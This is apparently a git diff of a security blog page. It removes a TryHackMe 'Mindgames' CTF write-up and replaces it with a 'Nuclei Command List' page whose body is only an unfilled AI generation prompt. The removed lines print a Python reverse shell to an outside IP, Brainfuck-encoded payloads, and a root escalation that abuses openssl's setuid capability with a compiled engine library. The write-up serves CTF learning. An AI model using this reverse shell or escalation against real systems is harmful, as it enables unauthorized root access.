@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Mindgames | Technical Intelligence Labs</title>
+    <title>Nuclei Command List | Technical Intelligence Labs</title>
     <link rel="stylesheet" href="../css/custom.css">
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
@@ -106,129 +106,36 @@
         <!-- Post Header -->
         <header class="mb-12 border-b border-slate-800 pb-12">
             <div class="flex items-center gap-4 text-xs font-mono text-slate-500 mb-6 uppercase tracking-widest">
-                <span class="px-2 py-1 bg-slate-900 border border-slate-800 rounded text-accent-green">tryhackme</span>
-                <span>// 2024-12-30</span>
-                <span>// ID: REF-Mindgames</span>
+                <span class="px-2 py-1 bg-slate-900 border border-slate-800 rounded text-accent-green">commands</span>
+                <span>// 2026-01-05</span>
+                <span>// ID: REF-Nuclei Command List</span>
             </div>
             
-            <h1 class="text-3xl md:text-5xl font-bold text-white mb-8 leading-tight font-mono">Mindgames</h1>
+            <h1 class="text-3xl md:text-5xl font-bold text-white mb-8 leading-tight font-mono">Nuclei Command List</h1>
             
             <div class="flex flex-wrap gap-2">
                 <!-- Tags populated by python -->
-                <!-- tryhackme, ctf -->
+                <!-- nuclei, cybersecurity, command reference, beginner -->
             </div>
         </header>
 
         <!-- Markdown Body -->
         <div class="markdown-content">
             <hr />
-<pre class="codehilite"><code>PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   2048 24:4f:06:26:0e:d3:7c:b8:18:42:40:12:7a:9e:3b:71 (RSA)
-|   256 5c:2b:3c:56:fd:60:2f:f7:28:34:47:55:d6:f8:8d:c1 (ECDSA)
-|_  256 da:16:8b:14:aa:58:0e:e1:74:85:6f:af:bf:6b:8d:58 (ED25519)
-80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
-|_http-title: Mindgames.
-Device type: general purpose
-Running: Linux 4.X
-OS CPE: cpe:/o:linux:linux_kernel:4.15
-OS details: Linux 4.15
-Network Distance: 3 hops
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-TRACEROUTE (using port 21/tcp)
-HOP RTT       ADDRESS
-1   478.29 ms 192.168.128.1
-2   ...
-3   478.29 ms mind.thm (10.64.144.177)
-</code></pre>
-
-<blockquote>
-<p>This is what the website has to say</p>
-</blockquote>
-<pre class="codehilite"><code>Hello, World
-
-+[-------&gt;++&lt;]&gt;++.++.---------.+++++.++++++.+[---&gt;+&lt;]&gt;+.------.++[-&gt;++&lt;]&gt;.-[-&gt;+++++&lt;]&gt;++.+++++++..+++.[-&gt;+++++&lt;]&gt;+.------------.---[-&gt;+++&lt;]&gt;.-[---&gt;+&lt;]&gt;---.+++.------.--------.-[---&gt;+&lt;]&gt;+.+++++++.&gt;++++++++++.
-
-Fibonacci
-
---[-----&gt;+&lt;]&gt;--.+.+.[---&gt;+&lt;]&gt;--.+++[-&gt;++&lt;]&gt;.[--&gt;+&lt;]&gt;+++++.[---&gt;++&lt;]&gt;--.++[++&gt;---&lt;]&gt;+.-[--&gt;+++&lt;]&gt;--.&gt;++++++++++.[-&gt;+++&lt;]&gt;++....-[---&gt;++&lt;]&gt;-.---.[---&gt;+&lt;]&gt;--.+[-----&gt;+&lt;]&gt;+.-[-&gt;+++++&lt;]&gt;-.--[-&gt;++&lt;]&gt;.+.+[--&gt;+&lt;]&gt;+.[--&gt;+++&lt;]&gt;+.+++++++++.&gt;++++++++++.[-&gt;+++&lt;]&gt;++........---[-----&gt;++&lt;]&gt;.-------------.[---&gt;+&lt;]&gt;---.+.---.----.-[-&gt;+++++&lt;]&gt;-.[--&gt;+++&lt;]&gt;+.&gt;++++++++++.[-&gt;+++&lt;]&gt;++....---[-----&gt;++&lt;]&gt;.-------------.[---&gt;+&lt;]&gt;---.+.---.----.-[-&gt;+++++&lt;]&gt;-.+++[-&gt;++&lt;]&gt;.[--&gt;+&lt;]&gt;+++++.[---&gt;++&lt;]&gt;--.[-----&gt;++&lt;]&gt;+.++++.--------.++.-[---&gt;+++++&lt;]&gt;.[--&gt;+&lt;]&gt;+++++.[---&gt;++&lt;]&gt;--.[-----&gt;++&lt;]&gt;+.+++++.---------.&gt;++++++++++...[---&gt;+++++&lt;]&gt;.+++++++++.+++.[--&gt;+++++&lt;]&gt;+++.-[---&gt;++&lt;]&gt;-.[---&gt;+&lt;]&gt;---.-[---&gt;++&lt;]&gt;-.+++++.-[-&gt;+++++&lt;]&gt;-.---[-----&gt;++&lt;]&gt;.+++[-&gt;+++&lt;]&gt;++.+++++++++++++.-------.--.--[-&gt;+++&lt;]&gt;-.+++++++++.-.-------.-[--&gt;+++&lt;]&gt;--.&gt;++++++++++.[-&gt;+++&lt;]&gt;++....[--&gt;+++++++&lt;]&gt;.++.---------.+++++.++++++.+[---&gt;+&lt;]&gt;+.-----[-&gt;++&lt;]&gt;.[--&gt;+&lt;]&gt;+++++.-----[-&gt;+++&lt;]&gt;.[-----&gt;++&lt;]&gt;-..&gt;++++++++++.
-</code></pre>
-
-<blockquote>
-<p>Use <code>Brainfuck</code> to decode <code>https://www.dcode.fr/brainfuck-language</code></p>
-<p>So I get reverse shell and decode it using brainfuck and run in brower and get reverse shell</p>
-</blockquote>
-<pre class="codehilite"><code>import pty
-import socket,os
-s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect((&quot;192.168.153.193&quot;, 5555))
-os.dup2(s.fileno(),0)
-os.dup2(s.fileno(),1)
-os.dup2(s.fileno(),2)
-pty.spawn(&quot;/bin/bash&quot;)
-</code></pre>
-
-<blockquote>
-<p>after decode</p>
-</blockquote>
-<pre class="codehilite"><code>++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;+++++.++++.+++.-.+++.++.&lt;&lt;++.&gt;&gt;----.++++.+++++.&lt;&lt;&lt;.&gt;&gt;&gt;----------------.++++.+++.-.+++.++.&lt;&lt;.&gt;&gt;-.----.------------.++++++++.------.+++++++++++++++.&lt;&lt;++++++++++++.&gt;&gt;-----.++++.&lt;&lt;&lt;.&gt;&gt;&gt;.&lt;---------.&gt;.----.------------.++++++++.------.+++++++++++++++.&lt;&lt;++.&gt;&gt;-.----.------------.++++++++.------.+++++++++++++++.&lt;&lt;------.&gt;&gt;-.----.------------.++++++++.------.+++++++++++++++.&lt;&lt;++++++.&gt;++++.+++++.&gt;---------------------.&lt;+++.+++++.---------.&gt;-----------.&lt;&lt;--.&gt;&gt;+++++++++++++++++++++++++++++++.----.------------.++++++++.------.+++++++++++++++.&lt;&lt;++.&gt;++++++++++++++.----.------------.++++++++.++++++++++++++++++++.------------.+.--.-------------.----.++++++++++++.&lt;-----.&lt;.&gt;&gt;&gt;-.&lt;&lt;+++++.&gt;&gt;----------------.++++++++++++.-..---------.--.+++++++++++++++++.&lt;&lt;------..------.+++++++++++++++.++++++++.-------.----.+++.+++++.++.----------.+++.++++.--.-----.+++.++++++++.------.-----------------.++++++++++.------------.+++++++++++++++++++++....------------..&lt;.&gt;&gt;&gt;-----.++++.&lt;&lt;+++++.&gt;&gt;---------------.+++++++++++++++++.-----.&lt;&lt;++++.----------.&gt;&gt;+++.&lt;&lt;++++++.&gt;&gt;-------------.+++.+++.-------.+++++++++.+.&lt;&lt;------.+.+++.++++.-------.&lt;.&gt;&gt;&gt;.++++.&lt;&lt;+++++.&gt;&gt;---------------.+++++++++++++++++.-----.&lt;&lt;++++.----------.&gt;&gt;+++.&lt;&lt;++++++.&gt;&gt;-------------.+++.+++.-------.+++++++++.+.&lt;&lt;------.+.+++.+++++.--------.&lt;.&gt;&gt;&gt;.++++.&lt;&lt;+++++.&gt;&gt;---------------.+++++++++++++++++.-----.&lt;&lt;++++.----------.&gt;&gt;+++.&lt;&lt;++++++.&gt;&gt;-------------.+++.+++.-------.+++++++++.+.&lt;&lt;------.+.+++.++++++.---------.&lt;.&gt;&gt;&gt;+.++++.+++++.&lt;&lt;+++++.&gt;&gt;------.---.---------------.++++++++++++++++++++++.---------.&lt;&lt;------.------.+++++++++++++.&gt;&gt;------------.+++++++.+++++.&lt;&lt;.&gt;&gt;------------.-.++++++++++++++++++.-----------.&lt;&lt;-------------.+++++++.
-</code></pre>
-
-<blockquote>
-<p>and run in browser and done</p>
-</blockquote>
-<pre class="codehilite"><code>mindgames@mindgames:~$ cat user.txt
-</code></pre>
-
-<blockquote>
-<p>after running lenpease found something</p>
-</blockquote>
-<pre class="codehilite"><code>[+] Files with POSIX capabilities set:
-/usr/bin/mtr-packet = cap_net_raw+ep
-/usr/bin/openssl = cap_setuid+ep
-/home/mindgames/webserver/server = cap_net_bind_service+ep
-</code></pre>
-
-<blockquote>
-<p>The “openssl” has the setuid cap. Which means, I can use openssl to setuid to 0 (root’s uid) and become root. Look at openssl | GTFOBins:</p>
-<p>OpenSSL can execute code via a library. So, I can code a simple C program to setuid(0), compile it to a library and use Openssl to exec it.</p>
-</blockquote>
-<pre class="codehilite"><code>#include &lt;openssl/engine.h&gt;
-#include &lt;unistd.h&gt;
-
-static int bind(ENGINE *e, const char *id)
-{
-    setuid(0);
-    setgid(0);
-    system(&quot;/bin/bash&quot;);
-}
-
-IMPLEMENT_DYNAMIC_BIND_FN(bind)
-IMPLEMENT_DYNAMIC_CHECK_FN()
-
-
-save as a shellroot.c
-</code></pre>
-
-<blockquote>
-<p>compile it</p>
-</blockquote>
-<pre class="codehilite"><code>gcc -fPIC -o shellroot.o -c shellroot.c
-gcc -shared -o shellroot.so -lcrypto shellroot.o
-</code></pre>
-
-<blockquote>
-<p>and get it into victim machine</p>
-</blockquote>
-<pre class="codehilite"><code>                    chmod +x shellroot.so
-mindgames@mindgames:~/webserver$ openssl req -engine ./shellroot.so
-root@mindgames:~/webserver# cd /root
-root@mindgames:/root# ls
-root.txt
-root@mindgames:/root# cat root.txt
-</code></pre>
+<h1>Nuclei Command Guide</h1>
+<p>Please generate a detailed educational guide for the <strong>Nuclei</strong> tool.<br />
+Follow this structure exactly:</p>
+<ol>
+<li><strong>Brief Explanation</strong>: Explain what Nuclei is and why it's used in cybersecurity.</li>
+<li><strong>Top 10 Useful Commands</strong>: List the 10 most common/useful commands for this tool.<ul>
+<li>For EACH command, provide the exact syntax in a code block.</li>
+<li>Explain what each flag does (<code>-x</code>, <code>-u</code>, etc.).</li>
+<li>Explain the <em>output</em> and <em>why</em> you would use this specific command.</li>
+</ul>
+</li>
+<li><strong>The Most Powerful Command</strong>: Highlight the single most powerful or "all-in-one" command for this tool and explain its power.</li>
+</ol>
+<p><strong>Tone</strong>: Educational, for a beginner student.</p>
         </div>
     </main>
 
